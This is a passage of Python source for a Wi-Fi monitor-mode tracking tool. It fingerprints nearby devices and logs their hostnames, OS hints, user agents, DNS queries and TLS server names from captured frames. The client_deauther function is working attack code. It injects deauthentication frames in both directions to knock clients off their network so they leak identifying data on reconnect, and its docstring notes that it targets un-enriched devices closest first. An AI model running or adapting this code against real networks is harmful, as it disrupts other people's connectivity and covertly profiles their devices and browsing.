            if ip and hostname:
                self.ip_to_host[ip] = hostname
            mac = normalize_mac(mac) if mac else None
            st = None
            if mac and mac in self.stations:
                st = self.stations[mac]
            elif ip:
                for s in self.stations.values():
                    if s.ip == ip:
                        st = s
                        break
            if st is None:
                return
            if ip:
                st.ip = ip
                if not hostname and ip in self.ip_to_host:
                    hostname = self.ip_to_host[ip]
            # hostname/model: prefer a more descriptive value over a bare one
            if hostname and (not st.hostname or len(hostname) > len(st.hostname)):
                st.hostname = hostname
            if model and (not st.model or len(model) > len(st.model)):
                st.model = model
            if os_hint and not st.os_hint:
                st.os_hint = os_hint
            if dhcp_fp and not st.dhcp_fp:
                st.dhcp_fp = dhcp_fp
            if nbios and not st.nbios:
                st.nbios = nbios
            if user_agent and not st.user_agent:
                st.user_agent = user_agent
            if os_guess and not st.os_guess:
                st.os_guess = os_guess          # weak (TTL); never overrides os_hint
            if ip6 and not st.ip6:
                st.ip6 = ip6
            if probe_fp and not st.probe_fp:
                st.probe_fp = probe_fp
            if service:
                st.services.add(service)
            if domain and len(st.domains) < 40:
                st.domains.add(domain)

    # backwards-compatible alias used by the local (on-host) enricher
    def set_l3(self, mac=None, ip=None, hostname=None):
        self.set_info(mac=mac, ip=ip, hostname=hostname)

    def set_fingerprint(self, mac, hint):
        mac = normalize_mac(mac)
        with self._lock:
            if mac and mac in self.stations and hint:
                self.stations[mac].fingerprint = hint

    def snapshot(self, include_aps=False, max_age=None, only_bssids=None):
        """Return a ranked list (closest first) of station dicts for display."""
        with self._lock:
            rows = []
            for st in self.stations.values():
                if st.is_ap and not include_aps:
                    continue
                if max_age is not None and st.age > max_age:
                    continue
                if only_bssids and st.bssid not in only_bssids:
                    continue
                rows.append(st)

            def key(s):
                rv = s.estimate(self.rank_by, self.window_s, self.half_life)
                usable = rv is not None and s.sample_count(None) >= 2
                return (not usable, -(rv if rv is not None else -999))
            rows.sort(key=key)
            return rows

    def stats(self):
        with self._lock:
            return {
                "frames": self.total_frames,
                "stations": sum(1 for s in self.stations.values()
                                if not s.is_ap),
                "aps": sum(1 for s in self.stations.values() if s.is_ap),
                "elapsed": time.time() - self.start,
                "mgmt": self.ftypes.get(0, 0),
                "data": self.ftypes.get(2, 0),
            }


# ===========================================================================
# Capture (scapy) -- lazy import lives here
# ===========================================================================

def run_capture(tracker, iface, oui, stop_event, args):
    """Blocking sniff loop. Runs in its own thread."""
    try:
        from scapy.all import (sniff, conf, RadioTap, Dot11, Dot11Beacon,
                               Dot11ProbeReq, Dot11ProbeResp, Dot11Elt)
        from scapy.all import ARP  # noqa
        try:
            from scapy.all import DHCP, BOOTP  # noqa
        except Exception:
            DHCP = BOOTP = None
        try:
            from scapy.all import DNS, DNSRR, DNSQR  # noqa
        except Exception:
            DNS = DNSRR = DNSQR = None
    except Exception as e:
        tracker.errors.append(f"scapy import failed: {e}")
        stop_event.set()
        return

    oui.attach_scapy(conf)

    def get_rssi(pkt):
        try:
            return int(pkt[RadioTap].dBm_AntSignal)
        except Exception:
            return None

    def get_channel(pkt):
        try:
            return freq_to_channel(int(pkt[RadioTap].ChannelFrequency))
        except Exception:
            return None

    def get_ssid(pkt):
        try:
            elt = pkt.getlayer(Dot11Elt)
            while elt is not None:
                if elt.ID == 0:
                    ssid = bytes(elt.info)
                    if ssid and all(32 <= b < 127 for b in ssid):
                        return ssid.decode("utf-8", "replace")
                    return None
                elt = elt.payload.getlayer(Dot11Elt)
        except Exception:
            pass
        return None

    def observe(*a, **k):
        k.setdefault("iface", iface)
        return tracker.observe(*a, **k)

    def handler(pkt):
        if stop_event.is_set():
            return
        if not pkt.haslayer(Dot11):
            return
        d = pkt[Dot11]
        rssi = get_rssi(pkt)
        chan = get_channel(pkt)
        ftype, fsub = d.type, d.subtype
        a1, a2, a3 = d.addr1, d.addr2, d.addr3
        try:
            tracker.ftypes[ftype] = tracker.ftypes.get(ftype, 0) + 1
        except Exception:
            pass

        # --- management frames -------------------------------------------
        if ftype == 0:
            if pkt.haslayer(Dot11Beacon) or fsub == 8:
                ssid = get_ssid(pkt)
                if a2:
                    observe(a2, rssi=rssi, channel=chan,
                                    is_ap=True, ssid=ssid)
                    if ssid:
                        tracker.register_bssid(a2, ssid)
                    w, cc, off = _parse_ht_vht(pkt, Dot11Elt)
                    if w or cc or off:
                        tracker.set_radio(a2, w, cc, off)
                    if a2 and tracker.security_unknown(a2):
                        tracker.set_security(a2, _beacon_security(
                            pkt, Dot11Elt, Dot11Beacon))
                return
            if pkt.haslayer(Dot11ProbeResp) or fsub == 5:
                ssid = get_ssid(pkt)
                if a2:
                    observe(a2, rssi=rssi, channel=chan,
                                    is_ap=True, ssid=ssid)
                    if ssid:
                        tracker.register_bssid(a2, ssid)
                return
            if pkt.haslayer(Dot11ProbeReq) or fsub == 4:
                ssid = get_ssid(pkt)
                observe(a2, rssi=rssi, channel=chan, ssid=ssid)
                if args.enrich_passive:
                    _parse_wps(pkt, tracker, a2, Dot11Elt)
                return
            observe(a2, rssi=rssi, channel=chan, bssid=a3)
            if args.enrich_passive and fsub in (0, 2):
                _parse_wps(pkt, tracker, a2, Dot11Elt)
            return

        # --- control frames (ACK/RTS/CTS): often no a2, skip cheaply -----
        if ftype == 1:
            if a2:
                observe(a2, rssi=rssi, channel=chan)
            return

        # --- data frames --------------------------------------------------
        if ftype == 2:
            try:
                fc = int(d.FCfield)
            except Exception:
                fc = 0
            to_ds = bool(fc & 0x1)
            from_ds = bool(fc & 0x2)
            protected = frame_is_protected(fc)
            bssid, station, tx_is_ap = infer_association(
                to_ds, from_ds, a1, a2, a3, tracker.is_known_bssid)
            dg = tracker.diag
            if to_ds and not from_ds:
                dg["tods"] += 1
            elif from_ds and not to_ds:
                dg["fromds"] += 1
            else:
                dg["wds"] += 1
            if station and normalize_mac(station) and not mac_is_multicast(station):
                dg["cli_uni"] += 1
                if bssid and tracker.is_known_bssid(bssid):
                    dg["cli_target"] += 1
            else:
                dg["cli_mc"] += 1
            if tx_is_ap:
                observe(a2, rssi=rssi, channel=chan, is_ap=True)
                if station:
                    observe(station, channel=chan, bssid=bssid)
            else:
                observe(a2, rssi=rssi, channel=chan, bssid=bssid)
            if bssid:
                tracker.note_data(bssid)

            if args.enrich_passive and not protected:
                from_station = to_ds and not from_ds
                if from_station:
                    station_mac = a2
                elif from_ds and not to_ds:
                    station_mac = a1
                else:
                    station_mac = a2
                _passive_l3(pkt, tracker, station_mac,
                            ARP, DHCP, BOOTP, DNS, from_station=from_station)
            return

    def _sniff():
        try:
            sniff(iface=iface, prn=handler, store=False,
                  stop_filter=lambda p: stop_event.is_set())
        except PermissionError:
            tracker.errors.append("need root to capture â€” re-run with sudo.")
            stop_event.set()
        except OSError as e:
            tracker.errors.append(
                f"could not open '{iface}': {e}. Is it really in monitor "
                f"mode? (check: iw dev {iface} info). If the name is wrong, "
                f"list interfaces with: iw dev")
            stop_event.set()
        except Exception as e:
            tracker.errors.append(f"capture error ({type(e).__name__}): {e}")
            stop_event.set()

    _sniff()


def _s(v):
    """Bytes/str -> clean str."""
    if v is None:
        return None
    if isinstance(v, bytes):
        v = v.decode("utf-8", "replace")
    return str(v).strip().strip(".") or None


def _mdns_friendly(name):
    """
    'Akshats-iPhone._companion-link._tcp.local' -> ('Akshats-iPhone',
    'companion-link'). Returns (instance, service) best-effort.
    """
    name = _s(name) or ""
    m = re.match(r"^(.*?)\._([a-zA-Z0-9-]+)\._(?:tcp|udp)\b", name)
    if m:
        return m.group(1), m.group(2)
    return None, None


_SERVICE_NAMES = {
    "airplay": "airplay", "raop": "airplay", "airport": "airport",
    "companion-link": "apple", "apple-mobdev2": "apple", "sleep-proxy": "apple",
    "googlecast": "chromecast", "googlezone": "google", "spotify-connect": "spotify",
    "printer": "printer", "ipp": "printer", "ipps": "printer", "pdl-datastream": "printer",
    "smb": "fileshare", "afpovertcp": "fileshare", "ssh": "ssh", "sftp-ssh": "ssh",
    "homekit": "homekit", "hap": "homekit", "matter": "matter", "hue": "hue",
    "workstation": "workstation", "device-info": None, "http": None, "https": None,
}


def _passive_l3(pkt, tracker, station_mac, ARP, DHCP, BOOTP, DNS,
                from_station=False):
    """Extract everything a device leaks in the clear."""
    smac = normalize_mac(station_mac)
    try:
        if from_station and smac:
            ip4 = pkt.getlayer("IP")
            if ip4 is not None:
                src = getattr(ip4, "src", None)
                if src and valid_ipv4(src):
                    tracker.set_info(mac=smac, ip=src,
                                     os_guess=ttl_os(getattr(ip4, "ttl", None)))
            ip6 = pkt.getlayer("IPv6")
            if ip6 is not None:
                s6 = getattr(ip6, "src", None)
                if s6 and not str(s6).startswith("fe80"):
                    tracker.set_info(mac=smac, ip6=str(s6),
                                     os_guess=ttl_os(getattr(ip6, "hlim", None)))

        if ARP is not None and pkt.haslayer(ARP):
            arp = pkt[ARP]
            if arp.hwsrc and arp.psrc and arp.psrc not in ("0.0.0.0", None):
                tracker.set_info(mac=arp.hwsrc, ip=arp.psrc)

        if DHCP is not None and pkt.haslayer(DHCP):
            hostname = os_hint = req_ip = fp = None
            for opt in pkt[DHCP].options:
                if not isinstance(opt, tuple):
                    continue
                k = opt[0]
                if k == "hostname":
                    hostname = _s(opt[1])
                elif k in ("vendor_class_id", "vendor_class_identifier"):
                    os_hint = _dhcp_vendor_os(_s(opt[1]))
                elif k in ("requested_addr", "requested_address"):
                    req_ip = _s(opt[1])
                elif k in ("param_req_list", "parameter_request_list"):
                    try:
                        vals = opt[1] if isinstance(opt[1], (list, tuple)) \
                            else list(bytes(opt[1]))
                        fp = ",".join(str(int(x)) for x in vals)
                    except Exception:
                        fp = None
            climac = smac
            if BOOTP is not None and pkt.haslayer(BOOTP):
                try:
                    ch = pkt[BOOTP].chaddr
                    m = normalize_mac(ch[:6].hex()) if ch else None
                    if m:
                        climac = m
                except Exception:
                    pass
            if fp and not os_hint:
                os_hint = dhcp_fp_os(fp)
            if any((hostname, os_hint, req_ip, fp)):
                tracker.set_info(mac=climac, hostname=hostname, os_hint=os_hint,
                                 ip=req_ip, dhcp_fp=fp)

        udp = pkt.getlayer("UDP")
        if udp is not None:
            sport, dport = int(udp.sport), int(udp.dport)
            payload = bytes(udp.payload) if udp.payload else b""

            if DNS is not None and (5353 in (sport, dport)
                                    or 5355 in (sport, dport)) \
                    and pkt.haslayer(DNS):
                _parse_mdns(pkt[DNS], tracker, smac)

            elif DNS is not None and dport == 53 and pkt.haslayer(DNS):
                try:
                    dns = pkt[DNS]
                    if dns.qd is not None and int(getattr(dns, "qr", 0)) == 0:
                        qn = _s(dns.qd.qname)
                        if qn and not qn.endswith(".arpa"):
                            tracker.set_info(mac=smac, domain=qn)
                except Exception:
                    pass

            elif 1900 in (sport, dport) and payload:
                _parse_ssdp(payload, tracker, smac)

            elif 137 in (sport, dport) and payload:
                name = _parse_netbios(payload)
                if name:
                    tracker.set_info(mac=smac, nbios=name, hostname=name)

        tcp = pkt.getlayer("TCP")
        if tcp is not None and tcp.payload:
            data = bytes(tcp.payload)
            dport = int(tcp.dport)
            if dport == 80 or data[:3] in (b"GET", b"POS", b"HEA", b"PUT"):
                ua = _http_header(data, b"User-Agent")
                host = _http_header(data, b"Host")
                if ua or host:
                    tracker.set_info(mac=smac, user_agent=ua, domain=host)
            elif dport == 443:
                sni = _tls_sni(data)
                if sni:
                    tracker.set_info(mac=smac, domain=sni)
    except Exception:
        pass


_DHCP_FP_DB = {
    "1,3,6,15,26,28,51,58,59,43": "Android",
    "1,3,6,15,26,28,51,58,59,43,114": "Android",
    "1,33,3,6,15,26,28,51,58,59,43": "Android",
    "1,3,6,15,26,28,51,58,59": "Android/Linux",
    "1,15,3,6,44,46,47,31,33,121,249,43": "Windows",
    "1,15,3,6,44,46,47,31,33,121,249,252,43": "Windows",
    "1,15,3,6,44,46,47,31,33,121,249,43,0,176,67": "Windows",
    "1,121,3,6,15,119,252": "iOS/iPadOS",
    "1,121,3,6,15,119,252,95,44,46": "macOS",
    "1,3,6,15,119,95,252,44,46": "macOS",
    "1,121,3,6,15,114,119,252,95,44,46,101": "macOS",
    "1,3,6,12,15,28,42": "Linux",
    "1,28,2,3,15,6,119,12,44,47,26,121,42": "Linux (dhclient)",
    "1,3,6,12,15,17,23,28,29,31,33,40,41,42": "Linux",
    "1,3,6,15,66,67": "printer/embedded",
    "6,3,1,15,66,67,13,44,150,43": "VoIP phone",
    "1,3,6,15,28,51,58,59": "IoT/embedded",
}
_DHCP_FP_FAMILIES = (
    ("1,15,3,6,44,46,47,31,33,121,249", "Windows"),
    ("1,121,3,6,15,119,252", "iOS/macOS"),
    ("1,3,6,15,26,28,51,58,59", "Android"),
)


def dhcp_fp_os(param_req_list):
    """Map a DHCP option-55 signature to an OS guess."""
    if not param_req_list:
        return None
    s = param_req_list.strip()
    if s in _DHCP_FP_DB:
        return _DHCP_FP_DB[s]
    for prefix, name in _DHCP_FP_FAMILIES:
        if s.startswith(prefix):
            return name
    return None


def ttl_os(ttl):
    """Very weak OS hint from an IP packet's initial TTL / IPv6 hop-limit."""
    if ttl is None:
        return None
    try:
        ttl = int(ttl)
    except (TypeError, ValueError):
        return None
    if ttl <= 0:
        return None
    if ttl <= 64:
        return "Linux/Apple/Android"
    if ttl <= 128:
        return "Windows"
    return "network device"


def eui64_to_mac(ipv6):
    """Recover a MAC from an EUI-64 IPv6 address."""
    try:
        if "::" in ipv6:
            head, tail = ipv6.split("::", 1)
            head_g = head.split(":") if head else []
            tail_g = tail.split(":") if tail else []
            fill = 8 - (len(head_g) + len(tail_g))
            groups = head_g + ["0"] * fill + tail_g
        else:
            groups = ipv6.split(":")
        if len(groups) != 8:
            return None
        iid = [int(g or "0", 16) for g in groups[4:]]
        b = []
        for h in iid:
            b.append((h >> 8) & 0xFF)
            b.append(h & 0xFF)
        if b[3] != 0xFF or b[4] != 0xFE:
            return None
        mac_bytes = [b[0] ^ 0x02, b[1], b[2], b[5], b[6], b[7]]
        return ":".join("%02x" % x for x in mac_bytes)
    except Exception:
        return None


def kalman_step(state, measurement, q=0.6, r=6.0):
    """One 1-D Kalman update for an RSSI stream."""
    if measurement is None:
        return state
    if state is None:
        return (float(measurement), r)
    est, var = state
    var += q
    k = var / (var + r)
    est = est + k * (measurement - est)
    var = (1 - k) * var
    return (est, var)


def _dhcp_vendor_os(vci):
    """Map a DHCP vendor-class-identifier to a friendly OS hint."""
    if not vci:
        return None
    low = vci.lower()
    table = [("android", "Android"), ("msft", "Windows"), ("dhcpcd", "Linux"),
             ("udhcp", "Linux/embedded"), ("ccc", "Apple"), ("aap", "Apple"),
             ("darwin", "macOS/iOS"), ("iphone", "iPhone"), ("ipad", "iPad"),
             ("linux", "Linux"), ("roku", "Roku"), ("amazon", "Amazon"),
             ("nintendo", "Nintendo"), ("sonos", "Sonos"), ("dhcp", None)]
    for key, name in table:
        if key in low and name:
            return name
    return vci[:20]


def _parse_mdns(dns, tracker, smac):
    """Walk mDNS records for friendly name, model, services, and A records."""
    try:
        for attr, count in (("an", "ancount"), ("ns", "nscount"),
                            ("ar", "arcount"), ("qd", "qdcount")):
            rr = getattr(dns, attr, None)
            n = int(getattr(dns, count, 0) or 0)
            for _ in range(min(n, 32)):
                if rr is None:
                    break
                try:
                    rtype = int(getattr(rr, "type", 0))
                    rname = _s(getattr(rr, "rrname", None))
                    if rtype == 1:
                        ip = _s(getattr(rr, "rdata", None))
                        host = (rname or "").replace(".local", "")
                        if ip:
                            tracker.set_info(mac=smac, ip=ip, hostname=host or None)
                    elif rtype == 12:
                        inst, svc = _mdns_friendly(_s(getattr(rr, "rdata", None)))
                        if not svc:
                            _, svc = _mdns_friendly(rname)
                        if svc:
                            fs = _SERVICE_NAMES.get(svc, svc)
                            if fs:
                                tracker.set_info(mac=smac, service=fs)
                        if inst:
                            tracker.set_info(mac=smac, hostname=inst)
                    elif rtype == 16:
                        txt = getattr(rr, "rdata", None)
                        model = _txt_model(txt)
                        if model:
                            tracker.set_info(mac=smac, model=model)
                    elif rtype == 33:
                        tgt = _s(getattr(rr, "target", None))
                        if tgt:
                            tracker.set_info(mac=smac,
                                             hostname=tgt.replace(".local", ""))
                except Exception:
                    pass
                rr = getattr(rr, "payload", None)
    except Exception:
        pass


def _txt_model(txt):
    """Pull a model/name out of an mDNS TXT record."""
    try:
        items = txt if isinstance(txt, list) else [txt]
        for it in items:
            s = it.decode("utf-8", "replace") if isinstance(it, bytes) else str(it)
            for key in ("model=", "md=", "ty=", "am=", "product="):
                m = re.search(re.escape(key) + r"([^\x00;,]+)", s, re.I)
                if m:
                    val = m.group(1).strip()
                    if val and val.lower() not in ("unknown",):
                        return val[:24]
    except Exception:
        pass
    return None


def _parse_ssdp(payload, tracker, smac):
    """SSDP/UPnP NOTIFY/M-SEARCH: SERVER (OS) + device type."""
    try:
        text = payload.decode("utf-8", "replace")
        server = re.search(r"^SERVER:\s*(.+)$", text, re.I | re.M)
        if server:
            tracker.set_info(mac=smac, os_hint=server.group(1).strip()[:24])
        for hdr in ("NT", "ST"):
            m = re.search(r"^%s:\s*urn:[^:]+:device:([^:]+):" % hdr,
                          text, re.I | re.M)
            if m:
                tracker.set_info(mac=smac, service="upnp:" + m.group(1).lower())
    except Exception:
        pass


def _parse_netbios(payload):
    """Decode the first NetBIOS name from an NBNS packet."""
    try:
        if len(payload) < 46 or payload[12] != 0x20:
            return None
        enc = payload[13:45]
        out = []
        for i in range(0, 32, 2):
            hi = enc[i] - 0x41
            lo = enc[i + 1] - 0x41
            if hi < 0 or lo < 0 or hi > 15 or lo > 15:
                return None
            out.append((hi << 4) | lo)
        name = bytes(out).decode("ascii", "replace").strip().strip("\x00")
        name = name.rstrip()
        return name or None
    except Exception:
        return None


def _http_header(data, name):
    """Extract a header value from a raw HTTP request."""
    try:
        m = re.search(re.escape(name) + rb":\s*([^\r\n]+)", data, re.I)
        if m:
            return m.group(1).decode("utf-8", "replace").strip()[:80]
    except Exception:
        pass
    return None


def parse_tls_sni(data):
    """
    Parse the SNI (server_name) out of a TLS ClientHello by walking the record
    -> handshake -> extensions structure properly (not a regex guess). Returns
    the host string or None. Tolerant of truncation (returns None rather than
    raising) so a ClientHello split across TCP segments just yields no SNI.
    """
    try:
        n = len(data)
        if n < 43 or data[0] != 0x16:          # not a TLS handshake record
            return None
        if data[5] != 0x01:                    # not a ClientHello
            return None
        idx = 9                                # skip rec hdr(5) + hs type+len(4)
        idx += 2 + 32                          # client_version(2) + random(32)
        if idx >= n:
            return None
        sid_len = data[idx]; idx += 1 + sid_len
        if idx + 2 > n:
            return None
        cs_len = (data[idx] << 8) | data[idx + 1]; idx += 2 + cs_len
        if idx + 1 > n:
            return None
        comp_len = data[idx]; idx += 1 + comp_len
        if idx + 2 > n:
            return None
        ext_total = (data[idx] << 8) | data[idx + 1]; idx += 2
        end = min(n, idx + ext_total)
        while idx + 4 <= end:
            etype = (data[idx] << 8) | data[idx + 1]
            elen = (data[idx + 2] << 8) | data[idx + 3]
            idx += 4
            if etype == 0x0000:                # server_name extension
                j = idx + 2                    # skip server_name_list length(2)
                if j + 3 > n:
                    return None
                ntype = data[j]
                nlen = (data[j + 1] << 8) | data[j + 2]
                j += 3
                if ntype == 0 and 0 < nlen and j + nlen <= n:
                    host = data[j:j + nlen].decode("ascii", "replace")
                    if "." in host and not host.startswith("."):
                        return host[:80]
                return None
            idx += elen
    except Exception:
        pass
    return None


def _tls_sni(data):
    """Best-effort SNI extraction from a TLS ClientHello (proper parse first)."""
    host = parse_tls_sni(data)
    if host:
        return host
    try:                                        # last-ditch regex fallback
        if len(data) < 45 or data[0] != 0x16:
            return None
        m = re.search(rb"\x00\x00..\x00..\x00(..)([a-z0-9.\-]{3,})", data, re.I)
        if m:
            host = m.group(2).decode("ascii", "replace")
            if "." in host and not host.startswith("."):
                return host[:60]
    except Exception:
        pass
    return None


def classify_security(privacy, akm_types, has_wpa_ie=False):
    """Decide a network's security from its beacon."""
    if akm_types:
        if 8 in akm_types or 24 in akm_types:
            return "WPA3-SAE"
        if 18 in akm_types:
            return "OWE"
        if 1 in akm_types or 3 in akm_types or 11 in akm_types:
            return "WPA2-Ent"
        if 2 in akm_types:
            return "WPA2-PSK"
        return "WPA2"
    if has_wpa_ie:
        return "WPA"
    return "OPEN"


def _rsn_akms(info):
    """Extract AKM suite type bytes from an RSN element body."""
    try:
        i = 2 + 4
        pc = info[i] | (info[i + 1] << 8)
        i += 2 + 4 * pc
        ac = info[i] | (info[i + 1] << 8)
        i += 2
        akms = []
        for _ in range(ac):
            suite = info[i:i + 4]
            if len(suite) < 4:
                break
            akms.append(suite[3])
            i += 4
        return akms
    except Exception:
        return []


def _beacon_security(pkt, Dot11Elt, Dot11Beacon):
    """Classify a beacon/probe-response's network security."""
    privacy = False
    try:
        cap = pkt[Dot11Beacon].cap if pkt.haslayer(Dot11Beacon) else 0
        privacy = bool(int(cap) & 0x10)
    except Exception:
        pass
    akms = []
    has_wpa = False
    try:
        elt = pkt.getlayer(Dot11Elt)
        while elt is not None:
            try:
                eid = int(elt.ID)
                info = bytes(elt.info)
                if eid == 48:
                    akms = _rsn_akms(info)
                elif eid == 221 and info[:4] == b"\x00\x50\xf2\x01":
                    has_wpa = True
            except Exception:
                pass
            nxt = elt.payload
            elt = nxt.getlayer(Dot11Elt) if nxt else None
    except Exception:
        pass
    return classify_security(privacy, akms, has_wpa)


def _parse_ht_vht(pkt, Dot11Elt):
    """Read HT/VHT elements from a beacon to learn channel width."""
    width = center = offset = None
    try:
        elt = pkt.getlayer(Dot11Elt)
        while elt is not None:
            try:
                eid = int(elt.ID)
                info = bytes(elt.info)
                if eid == 61 and len(info) >= 2:
                    sec = info[1] & 0x03
                    if sec == 1:
                        offset = "+"
                    elif sec == 3:
                        offset = "-"
                    if offset and (info[1] & 0x04):
                        width = max(width or 0, 40)
                elif eid == 192 and len(info) >= 2:
                    w = info[0]
                    if w == 1:
                        width, center = 80, info[1]
                    elif w == 2:
                        width, center = 160, info[1]
                    elif w == 3:
                        width, center = 80, info[1]
            except Exception:
                pass
            nxt = elt.payload
            elt = nxt.getlayer(Dot11Elt) if nxt else None
    except Exception:
        pass
    return width, center, offset


def _parse_wps(pkt, tracker, mac, Dot11Elt):
    """Parse WPS info elements from probe/assoc requests."""
    smac = normalize_mac(mac)
    if not smac:
        return
    try:
        elt = pkt.getlayer(Dot11Elt)
        while elt is not None:
            if int(elt.ID) == 221:
                info = bytes(elt.info)
                if info[:4] == b"\x00\x50\xf2\x04":
                    _parse_wps_tlvs(info[4:], tracker, smac)
            nxt = elt.payload
            elt = nxt.getlayer(Dot11Elt) if nxt else None
    except Exception:
        pass


def _parse_wps_tlvs(data, tracker, smac):
    fields = {0x1011: "device_name", 0x1021: "manufacturer",
              0x1023: "model_name", 0x1024: "model_number"}
    try:
        i = 0
        found = {}
        while i + 4 <= len(data):
            t = (data[i] << 8) | data[i + 1]
            ln = (data[i + 2] << 8) | data[i + 3]
            val = data[i + 4:i + 4 + ln]
            if t in fields:
                found[fields[t]] = val.decode("utf-8", "replace").strip()
            i += 4 + ln
        if found.get("device_name"):
            tracker.set_info(mac=smac, hostname=found["device_name"])
        model = " ".join(x for x in (found.get("manufacturer"),
                                     found.get("model_name")) if x).strip()
        if model:
            tracker.set_info(mac=smac, model=model[:24])
    except Exception:
        pass


# ===========================================================================
# Channel hopping
# ===========================================================================

def _set_channel(iface, ch, width=None, center_ch=None, ht_offset=None):
    """Tune to a channel; when width info is known, capture at that width."""
    cmd = width_iw_args(iface, ch, width, center_ch, ht_offset)
    if not cmd:
        return False
    try:
        r = subprocess.run(cmd, stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL, timeout=2.0)
        if r.returncode == 0:
            return True
        if len(cmd) > 6:
            subprocess.run(["iw", "dev", iface, "set", "channel", str(ch)],
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL, timeout=2.0)
    except Exception:
        pass
    return False


def client_pinger(tracker, iface, stop_event, args, src_mac):
    """
    ACTIVE (authorized-lab only): periodically inject a unicast RTS to each
    tracked client so it answers with a CTS. Non-disruptive liveness probe.
    """
    try:
        from scapy.all import RadioTap, Dot11, sendp
    except Exception as e:
        tracker.errors.append(f"--ping-clients needs scapy: {e}")
        return
    while not stop_event.is_set():
        try:
            rows = tracker.snapshot(max_age=args.max_age)
        except Exception:
            rows = []
        targets = [s.mac for s in rows if not s.is_ap][:args.ping_max]
        for mac in targets:
            if stop_event.is_set():
                break
            f = rts_fields(mac, src_mac)
            if not f:
                continue
            try:
                pkt = (RadioTap() /
                       Dot11(type=f["type"], subtype=f["subtype"],
                             addr1=f["addr1"], addr2=f["addr2"]))
                sendp(pkt, iface=iface, verbose=0)
                tracker.pings += 1
            except Exception as e:
                tracker.errors.append(
                    f"RTS injection failed on {iface}: {e}. Does the adapter "
                    f"support injection? (aireplay-ng --test {iface})")
                return
            stop_event.wait(args.ping_gap)
        stop_event.wait(args.ping_interval)


def client_deauther(tracker, iface, stop_event, args, inject_iface=None):
    """
    ACTIVE (authorized-lab only): periodically send deauthentication frames
    to tracked clients, forcing them to reassociate with their AP. During
    reassociation, clients re-send DHCP requests, ARP packets, mDNS
    announcements, and probe requests â€” all of which leak IP addresses,
    hostnames, OS fingerprints, and device information that is otherwise
    invisible on encrypted (WPA2/WPA3) networks.

    Dual-adapter mode: when inject_iface is given, deauths are sent on
    that adapter (tuned to the target's channel first), while the capture
    adapter keeps listening on iface. Single-adapter fallback: inject on
    iface itself.

    Features:
     - Channel-aware injection: tunes inject adapter to each target's
       last-known channel before sending.
     - Per-client cooldown (--deauth-cooldown): skip clients deauthed
       within the cooldown window to minimise disruption.
     - Smart targeting (--deauth-smart): only deauth clients that are
       still missing hostname, IP, AND os_hint â€” i.e. enrichment would
       actually benefit from a reassociation.
     - Proximity-first: targets are sorted by RSSI (closest first) so
       the nearest un-enriched device gets attention first.

    Sends deauths in BOTH directions (AP->client and client->AP) for
    maximum effectiveness. Rate-limited to minimize disruption.

    WARNING: This DISCONNECTS clients temporarily. Use ONLY on networks
    and devices you are authorized to test.
    """
    try:
        from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
    except Exception as e:
        tracker.errors.append(f"--deauth needs scapy: {e}")
        return

    tx_iface = inject_iface or iface
    cooldown = getattr(args, "deauth_cooldown", 120)
    smart = getattr(args, "deauth_smart", False)

    while not stop_event.is_set():
        try:
            rows = tracker.snapshot(max_age=args.max_age)
        except Exception:
            rows = []

        # Build target list: associated clients with known BSSIDs,
        # already sorted by RSSI (snapshot returns closest-first).
        candidates = [(s.mac, s.bssid, s.channels) for s in rows
                      if not s.is_ap and s.bssid]

        # Apply cooldown filter â€” skip clients deauthed recently.
        candidates = [(m, b, ch) for m, b, ch in candidates
                      if tracker.deauth_due(m, cooldown)]

        # Smart mode: only deauth clients that actually need enrichment.
        if smart:
            candidates = [(m, b, ch) for m, b, ch in candidates
                          if tracker.needs_enrichment(m)]

        targets = candidates[:args.deauth_max]

        for mac, bssid, channels in targets:
            if stop_event.is_set():
                break
            f = deauth_fields(mac, bssid)
            if not f:
                continue

            # Channel-aware injection: tune the inject adapter to the
            # target's last-known channel so the frame reaches it.
            if channels and inject_iface:
                target_ch = sorted(channels)[-1]  # highest = most recent
                try:
                    _set_channel(tx_iface, target_ch)
                except Exception:
                    pass  # best-effort; may still work on current channel

            try:
                # Direction 1: AP -> client (client thinks AP kicked it)
                pkt_ap = (RadioTap() /
                          Dot11(type=f["type"], subtype=f["subtype"],
                                addr1=f["addr1"], addr2=f["addr2"],
                                addr3=f["addr3"]) /
                          Dot11Deauth(reason=f["reason"]))
                sendp(pkt_ap, iface=tx_iface, count=args.deauth_count,
                      inter=0.02, verbose=0)

                # Direction 2: client -> AP (AP drops the association)
                pkt_cli = (RadioTap() /
                           Dot11(type=0, subtype=12,
                                 addr1=bssid, addr2=mac,
                                 addr3=bssid) /
                           Dot11Deauth(reason=7))
                sendp(pkt_cli, iface=tx_iface, count=args.deauth_count,
                      inter=0.02, verbose=0)

                tracker.deauths += args.deauth_count * 2
                tracker.log_deauth(mac)
            except Exception as e:
                tracker.errors.append(
                    f"Deauth injection failed on {tx_iface}: {e}. Does the "
                    f"adapter support injection? (aireplay-ng --test {tx_iface})")
                return
            stop_event.wait(args.deauth_gap)

        stop_event.wait(args.deauth_interval)


def channel_hopper(iface, channels, stop_event, dwell=0.20,
                   tracker=None, ssid=None, rescan_every=12,
                   lock_strongest=False, lock_after=20.0, relock_every=90.0,
                   force_width=None):
    """Cycle channels with iw."""
    sweeps = 0
    started = time.time()
    locked_ch = None
    last_relock = 0.0

    while not stop_event.is_set():
        now = time.time()
        if (lock_strongest and tracker is not None and ssid
                and (now - started) >= lock_after):
            if locked_ch is None or (now - last_relock) >= relock_every:
                if locked_ch is not None:
                    for ch in sorted(tracker.channels_for_ssid(ssid)) or channels:
                        if stop_event.is_set():
                            break
                        _set_channel(iface, ch)
                        stop_event.wait(dwell)
                best = tracker.best_ap_for_ssid(ssid)
                if best:
                    locked_ch = best[1]
                    w, cc, off = tracker.radio_for(best[0])
                    if force_width:
                        w = force_width
                    _set_channel(iface, locked_ch, w, cc, off)
                    tracker.lock_info = (best[0], locked_ch, best[2], w)
                last_relock = time.time()
            if locked_ch is not None:
                stop_event.wait(2.0)
                continue

        hop_set = channels
        if tracker is not None and ssid:
            focus = tracker.channels_for_ssid(ssid)
            if focus and (sweeps % rescan_every != 0):
                hop_set = sorted(focus)
        for ch in hop_set:
            if stop_event.is_set():
                break
            _set_channel(iface, ch)
            stop_event.wait(dwell)
        sweeps += 1


# ===========================================================================
# Local (on-host) enrichment
# ===========================================================================

def parse_ip_addr_show(text):
    """Parse `ip -o -f inet addr show dev X` -> (ip, prefixlen) or (None, None)."""
